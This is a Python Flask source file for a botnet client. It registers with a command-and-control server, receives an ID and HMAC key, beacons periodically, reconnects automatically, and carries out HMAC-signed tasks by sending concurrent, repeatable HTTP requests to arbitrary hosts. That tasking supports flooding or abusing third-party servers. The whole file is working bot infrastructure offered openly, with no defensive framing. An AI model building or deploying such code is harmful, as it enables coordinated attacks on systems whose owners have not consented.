from flask import Flask
from flask import request
from flask import Response
import json
import requests
import threading
import time
import signal
import sys
import base64
import hashlib
import hmac

app = Flask(__name__)
lock = threading.Lock()

PORT = "4600"
SERVER_IP = "localhost:8080"
VERSION = "0.0.1"
ID = ""
HMACSK = b""
CONNECTED = False

####################################
# Performing Tasks
####################################
class HTTPRequestStruct:
    def __init__(self, method, host, path, headers, body):
        self.method = method
        self.host = host
        self.path = path
        self.headers = headers
        self.body = body
    def do_request(self):
        if self.method == "GET":
            if self.path[0] != "/":
                r = requests.get(self.host + "/" + self.path, headers=self.headers)
                return r.status_code, r.headers, r.text
            else:
                r = requests.get(self.host + self.path, headers=self.headers)
                return r.status_code, r.headers, r.text
        elif self.method == "POST":
            if self.path[0] != "/":
                r = requests.post(self.host + "/" + self.path, data=self.body, headers=self.headers)
                return r.status_code, r.headers, r.text
            else:
                r = requests.post(self.host + self.path, data=self.body, headers=self.headers)
                return r.status_code, r.headers, r.text

class Task:
    def __init__(self, raw_task):
        # This is the raw JSON for a task
        self.raw_task = raw_task

        # Initialize http requests
        self.http_requests = []

        # Create list of tuples for responses containing
        # the status code and the actual request body
        self.result = []

        #This is the ID for the task
        self.id = 0

        # This indicates how many times we do the task
        self.times = 1

        # Parse the json
        tasks_loaded = json.loads(self.raw_task)
        for request in tasks_loaded:
            method = request["Method"]
            host = request["Host"]
            path = request["Path"]
            headers = request["Headers"]
            body = request["Body"]
            http_request_deserialized = HTTPRequestStruct(method, host, path, headers, body)
            self.http_requests.append(http_request_deserialized)
    def do_task(self):
        for x in range(self.times):
            threads = []
            for request in self.http_requests:
                t = threading.Thread(target=request.do_request, args=[])
                t.start()
                threads.append(t)
                print("[*] Doing request. Thread ID: {}".format(t.getName()))
            for thread in threads:
                thread.join()
            # Calculate HMAC of request
            hmac_hasher = hmac.new(HMACSK, digestmod="sha256")
            buff = "DONE" + ID + str(self.id) + "" + VERSION
            hmac_hasher.update(buff.encode("utf-8"))
            hmac_hash = hmac_hasher.digest()
            hmac_hash_b64 = base64.urlsafe_b64encode(hmac_hash).decode("utf-8")
            requests.post("http://" + SERVER_IP + "/done", data={"Type":"DONE", "ID": ID, 
                "Message":str(self.id), "MessageBinary":"", "Version":VERSION, 
                "HMACHash":hmac_hash_b64})

class TaskManager(Task):
    def __init__(self):
        self.tasks = []
    def push_task(self, Task):
        lock.acquire()
        self.tasks.append(Task)
        lock.release()
    def do_tasks(self):
        while True:
            for x in range(len(self.tasks)):
                self.tasks[x].do_task() # @BUG: concurrency issue here probably
                lock.acquire()
                del self.tasks[x]
                lock.release()
            time.sleep(0.1)

task_manager = TaskManager()

def task_subroutine():
    t_id = threading.Thread(target=task_manager.do_tasks, args=[])
    t_id.start()

####################################
# Server (on port PORT)
####################################
@app.route("/", methods=["GET", "POST"])
def Index():
    return "Hello, world!"

@app.route("/uploadtask", methods=["GET", "POST"])
def UploadTask():
    if request.method == "POST":
        # Parse the request
        r_Type = request.form["Type"]
        r_ID = request.form["ID"]
        r_Message = request.form["Message"]
        r_MessageBinary = request.form["MessageBinary"]
        r_Version = request.form["Version"]
        r_HMACHash = request.form["HMACHash"]
        r_HMACHashDecoded = base64.urlsafe_b64decode(r_HMACHash)

        # Do our own HMAC hash for the request
        global HMACSK
        hmac_hasher = hmac.new(HMACSK, digestmod="SHA256")
        buff = r_Type + r_ID + r_Message + r_MessageBinary + r_Version
        hmac_hasher.update(buff.encode("utf-8"))
        computed_hmac_hash = hmac_hasher.digest()

        if hmac.compare_digest(r_HMACHashDecoded, computed_hmac_hash) == True:
            print("[+] Accepted new task!")
            # Deserialize the task from the message
            task = Task(r_Message)
            task_manager.push_task(task)

            # return okay so we can be done with the connection
            return "Okay"
        else:
            return Response("Error", status=403, mimetype='application/text')

@app.route("/ping", methods=["GET", "POST"])
def Ping():
    # Parse the request
    print("1")
    r_Type = request.form["Type"]
    r_ID = request.form["ID"]
    r_Message = request.form["Message"]
    r_MessageBinary = request.form["MessageBinary"]
    r_Version = request.form["Version"]
    r_HMACHash = request.form["HMACHash"]
    r_HMACHashDecoded = base64.urlsafe_b64decode(r_HMACHash)
    print("2")

    # Do our own HMAC hash for the request
    global HMACSK
    hmac_hasher = hmac.new(HMACSK, digestmod="SHA256")
    buff = r_Type + r_ID + r_Message + r_MessageBinary + r_Version
    hmac_hasher.update(buff.encode("utf-8"))
    computed_hmac_hash = hmac_hasher.digest()

    if hmac.compare_digest(r_HMACHashDecoded, computed_hmac_hash) == True:
        # Calculate HMAC of packet
        hmac_hasher = hmac.new(HMACSK, digestmod="sha256")
        hmac_hasher.update(("PONG" + ID + "" + "" + VERSION).encode("utf-8"))
        digest = hmac_hasher.digest()
        hmac_hash_b64 = base64.urlsafe_b64encode(digest)

        # Send response back
        response = {
        "Type": "PONG",
        "ID":ID,
        "Message":"",
        "MessageBinary":"",
        "Version":VERSION,
        "HMACHash":hmac_hash_b64.decode("utf-8")
        }
        response_json = json.dumps(response)
        return response_json
    else:
        return Response("Error", status=403, mimetype='application/text')


############################################
# Functions to interact with botnet server
############################################
def join_botnet():
    print("[+] Attempting to join botnet...")
    try:
        response = requests.post("http://" + SERVER_IP + "/join", data={
            "Type":"JOIN",
            "ID":"",
            "Message":"",
            "MessageBinary":"",
            "Version":VERSION,
        }, timeout=5)
    except:
        return False
    print("[+] Received JOIN response")
    response_parsed = json.loads(response.text)
    resp_message = response_parsed["Message"]
    resp_type = response_parsed["Type"]
    resp_message_binary = response_parsed["MessageBinary"]
    if resp_type == "UPDATE":
        # @TODO: make it so that it updates if it is the wrong version
        print("[+] Server indicated that we must update the client")
        pass
    else:
        print("[*] Successfully joined botnet!")
        global ID
        ID = resp_message
        print("\tID: {}".format(ID))
        global HMACSK
        HMACSK = base64.urlsafe_b64decode(resp_message_binary)
        print("\tHMAC Key (base64 url encoding): {}".format(resp_message))
        return True
    return False

def auto_join_botnet_subroutine():
    joined = False
    while True:
        joined = join_botnet()
        time.sleep(5)
        global CONNECTED
        CONNECTED = joined
        if CONNECTED == True:
            break

def disconnect():
    # Calculate HMAC hash of request
    hmac_hasher = hmac.new(HMACSK, digestmod="SHA256")
    hmac_hasher.update(("DISCONNECT" + ID + "I gtg bud" + "" + VERSION).encode("utf-8"))
    hmac_hash = hmac_hasher.digest()
    hmac_hash_b64 = base64.urlsafe_b64encode(hmac_hash).decode("utf-8")

    # Perform request
    try:
        response = requests.post("http://" + SERVER_IP + "/disconnect", data={
            "Type":"DISCONNECT",
            "ID":ID,
            "Message":"I gtg bud",
            "MessageBinary":"",
            "Version":VERSION,
            "HMACHash":hmac_hash_b64
        })
    except:
        print("[+] Failed to send DISCONNECT msg")

def ping_server():
    # Calculate HMAC hash of request
    hmac_hasher = hmac.new(HMACSK, digestmod="SHA256")
    hmac_hasher.update(("PING" + ID + "" + "" + VERSION).encode("utf-8"))
    hmac_hash = hmac_hasher.digest()
    hmac_hash_b64 = base64.urlsafe_b64encode(hmac_hash).decode("utf-8")

    # Perform request
    try:
        response = requests.post("http://" + SERVER_IP + "/ping", data={
            "Type":"PING",
            "ID":ID,
            "MessageBinary":"",
            "Version":VERSION,
            "HMACHash":hmac_hash_b64
        }, timeout=8)
        if response.status_code == 200:
            return True
        else:
            print(response.status_code)
            return False
    except:
        return False
    

# auto_server_pinger - Essentially a cron job to ping the server every once in a while
# If we do not successfully ping the server, we try to autoreconnect to the botnet
def ping_server_subroutine():
    while True:
        ping_result = ping_server()
        if ping_result == False:
            print("[+] Somehow got disconnected from server. Trying to autoreconnect")
            auto_join_botnet_subroutine()
        time.sleep(5)

def auto_ping_server_subroutine_wrapper():
    t_id = threading.Thread(target=ping_server_subroutine, args=[])
    t_id.start()
        


##################################
# Some utility functions
##################################
def sigint_handler(sig, frame):
    print("[*] Intercepted sigint!")
    print("\tGracefully quitting!")
    disconnect()
    quit()


if __name__ == "__main__":
    signal.signal(signal.SIGINT, sigint_handler)
    auto_join_botnet_subroutine()
    task_subroutine()
    auto_ping_server_subroutine_wrapper()
    app.run(debug=False, port=int(PORT))